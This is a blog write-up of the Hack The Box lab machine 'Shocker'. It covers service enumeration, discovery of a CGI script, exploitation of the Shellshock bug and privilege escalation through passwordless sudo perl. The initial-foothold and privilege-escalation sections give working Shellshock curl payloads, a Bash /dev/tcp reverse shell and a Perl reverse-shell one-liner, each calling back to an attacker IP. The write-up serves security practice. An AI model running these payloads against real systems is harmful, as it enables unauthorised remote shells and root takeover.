---
layout: single
title: "HTB - Shocker"
last_modified_at: 2021-04-14 01:00:00 -0700
categories: writeups
tags: [HTB]
image:
  feature:
share: true
date: 2021-02-07 01:00:00 -0700
toc: true
toc_label: "Table of Contents"
classes: wide
---
# HTB - Shocker
![Shocker picture](/assets/images/writeups/shocker.png)

**IP**: 10.129.97.115 \
**Completed on**: February 7, 2021 \
**Time to Complete**: 48 minutes \
**OS**: Linux 

**Note!** Added shocker IP to /etc/hosts as `shocker shocker.htb`
{: .notice--success}

## Enumeration

### Nmap
Nmap version and port scan with default scripts enabled found only 2 ports open (`-sV -sC`):
* 80 (Apache 2.4.18)
* 2222 (OpenSSH 7.2p2)

### Enumerating Apache Server
Routing to `http://shocker.htb` I encountered a bug, like, an actual picture of a bug:

![Shocker root http server picture](/assets/images/writeups/shocker-http.png)

### Forced Directory

The default page is a static HTML page with a picture. Trying to route to index.html vs index.php we can confirm the site is using html extension. Since we have nothing else to go by, I ran a gobuster to force browse directories:

**Note!** The image does not show but /cgi-bin/ returned a 404 response.
{: .notice--success}

```
sudo gobuster dir -x html -u http://shocker.htb/ -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![Gobuster with general wordlist using html extension picture](/assets/images/writeups/shocker-gobuster1.png)

I was not able to find anything interesting, but knowing the machine is called “Shocker” I went ahead and ran a dirbuster with CGIs wordlist even though /cgi-bin/ was returning a 404 and discovered a bash file:

```
sudo gobuster dir -u http://shocker.htb/ -w ~/SecLists/Discovery/Web-Content/CGIs.txt
```

![Gobuster with cgi-bin wordlist picture](/assets/images/writeups/shocker-gobuster2.png)

Routing to the site (`http://shocker.htb/cgi-bin/user.sh`) it asks for user.sh to download, using curl I was able to see the script's content, it was running a uptime script and outputting the content when reached:

![Picture of curl to the user shell file](/assets/images/writeups/shocker-user-sh.png)

## Initial Foothold

With the found shell script, I ran a POC Shellshock payload using curl that should list the home directory (`ls`):

```
curl -A "() { :;};echo;/bin/ls -la /home" http://shocker.htb/cgi-bin/user.sh
```

![Picture of curl to the user shell file outputting ls](/assets/images/writeups/shocker-shock-ls.png)

The POC confirmed that shellshock is possible against this script. I then utilize this vulnerability to create a reverse shell with `/bin/bash`:

```
# Don’t forget to open a netcat listener using: sudo nc -nlvp 7000
curl -A "() { :;};echo;/bin/bash -i > /dev/tcp/10.10.14.69/7000 0<&1 2>&1" http://shocker.htb/cgi-bin/user.sh
```
![Picture of curl to the user shell creating a reverse shell](/assets/images/writeups/shocker-shock-reverse.png)

This granted me a user shell as `shelly`. Now lets move into enumerate state again to privilege escalate.

## Privilege Escalation

I used `sudo -l` to list shelly's sudo privileges, we see she is able to run perl as root without a password:

![Picture of sudo -l command through shelly user](/assets/images/writeups/shocker-sudo.png)

Perfect! Using this I created a privilege reverse shell using perl to get root:

```
# Don’t forget to open a netcat listener using: sudo nc -nlvp 7001
sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.69";$p=7001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

![Picture of perl to privilege escalate](/assets/images/writeups/shocker-perl.png)

That’s it! Although this box was easier, it goes to show how severe ShellShock vulnerability was during 2014-2018. 

According to Security Intelligence's August 2020 [article](https://securityintelligence.com/articles/shellshock-vulnerability-in-depth/) it's still relevant in 2020 considering there is a large number of vulnerable servers. The article points to Politico's January 2020 [news article](https://www.politico.com/news/2020/01/16/georgia-election-systems-could-have-been-hacked-before-2016-vote-100334) which reported that Georgia election systems was still vulnerable to ShellShock.